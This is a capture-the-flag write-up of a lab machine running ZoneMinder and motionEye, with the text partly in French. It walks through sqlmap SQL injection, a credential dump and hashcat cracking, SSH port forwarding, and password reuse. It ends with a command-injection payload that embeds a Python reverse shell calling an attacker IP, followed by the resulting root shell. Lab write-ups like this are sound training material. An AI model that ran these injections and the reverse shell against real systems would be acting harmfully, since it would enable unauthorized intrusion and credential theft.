
![[CCTV logo.png]]

# Attack Chain

```
Attaquant (Externe)
  └─► SQL Injection (ZoneMinder 'tid') → Dump DB 'zm' (Table Users)
        └─► Extraction de credentials → mark & admin
              └─► SSH Login → mark@cctv.htb (User)
                    └─► Local Port Forwarding (SSH -L) → 127.0.0.1:8765 (motionEye)
                          └─► Password Reuse → admin@motionEye (creds ZoneMinder)
                                └─► Command Injection (Exploit-DB 52481)
                                      └─► Reverse Shell → root@cctv ✅
```

# Enumeration


```
nmap -sVC 10.129.2.229

Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-07 20:26 CST
Nmap scan report for 10.129.2.229
Host is up (0.0093s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 76:1d:73:98:fa:05:f7:0b:04:c2:3b:c4:7d:e6:db:4a (ECDSA)
|_  256 e3:9b:38:08:9a:d7:e9:d1:94:11:ff:50:80:bc:f2:59 (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Did not follow redirect to http://cctv.htb/
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

```
echo '10.129.244.156 cctv.htb' | tee -a /etc/hosts
```


admin admin sur la page

https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3

```
sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --cookie="ZMSESSID=bvptsj3rq677ql7si5p9nalkr9"
```

```
sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --cookie="ZMSESSID=bvptsj3rq677ql7si5p9nalkr9" --dbs

<SNIP>

available databases [3]:
[*] information_schema
[*] performance_schema
[*] zm

<SNIP>
```

```
+----------------------+
| Config               |
| ControlPresets       |
| Controls             |
| Devices              |
| Event_Data           |
| Event_Summaries      |
| Events_Archived      |
| Events_Day           |
| Events_Hour          |
| Events_Month         |
| Events_Tags          |
| Events_Week          |
| Filters              |
| Frames               |
| Groups_Monitors      |
| Groups_Permissions   |
| Manufacturers        |
| Maps                 |
| Models               |
| MonitorPresets       |
| Monitor_Status       |
| Monitors             |
| Monitors_Permissions |
| MontageLayouts       |
| Object_Types         |
| Reports              |
| Server_Stats         |
| Servers              |
| Sessions             |
| Snapshots            |
| Snapshots_Events     |
| States               |
| Stats                |
| Tags                 |
| TriggersX10          |
| User_Preferences     |
| Users                |
| ZonePresets          |
| Zones                |
| Events               |
| Groups               |
| Logs                 |
| Storage              |
+----------------------+

```


```
sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --cookie="ZMSESSID=6rdp14rl0bq26dpls1t247h0cr" -D zm -T Users -C Username,Password --dump --batch

<SNIP>

+------------+--------------------------------------------------------------+
| Username   | Password                                                     |
+------------+--------------------------------------------------------------+
| superadmin | $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm |
| mark       | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. |
| admin      | $2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m |
+------------+--------------------------------------------------------------+

<SNIP>
```

```
hashcat hash.txt -m 3200 /usr/share/wordlists/rockyou.txt.gz

<SNIP>

$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.:opensesame
```


```
netstat -ltnp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:7999          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:1935          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:9081          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8765          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8554          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

```
curl -I http://127.0.0.1:8888
HTTP/1.1 404 Not Found
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: *
Content-Type: text/plain
Server: mediamtx
Date: Sun, 08 Mar 2026 10:57:18 GMT
Content-Length: 18
```


```
ssh -L 9081:127.0.0.1:9081 -L 8888:127.0.0.1:8888 -L 8765:127.0.0.1:8765 mark@cctv.htb
```

```
http://127.0.0.1:8765
```

creds

```
user:<blank>
```

But it doesn't let us exploit the **CVE-2025-60787** since we need to have admin privileges.

```
mark@cctv:/etc/motioneye$ cat motion.conf

# @admin_username admin
# @normal_username user
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
# @lang en
# @enabled on
# @normal_password


setup_mode off
webcontrol_port 7999
webcontrol_interface 1
webcontrol_localhost on
webcontrol_parms 2

camera camera-1.conf
```

We found the conf file of motioneye containing the password hash of admin.

And it works on the the website

```
admin:989c5a8ee87a0e9521ec81a79187d162109282f0
```

In F12 > console

```
configUiValid = function() { return true; };
```


https://www.exploit-db.com/exploits/52481


```
$(python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.113",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")').%Y-%m-%d-%H-%M-%S
```

```
nc -lvnp 443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.129.1.202.
Ncat: Connection from 10.129.1.202:45038.
root@cctv:/etc/motioneye#
```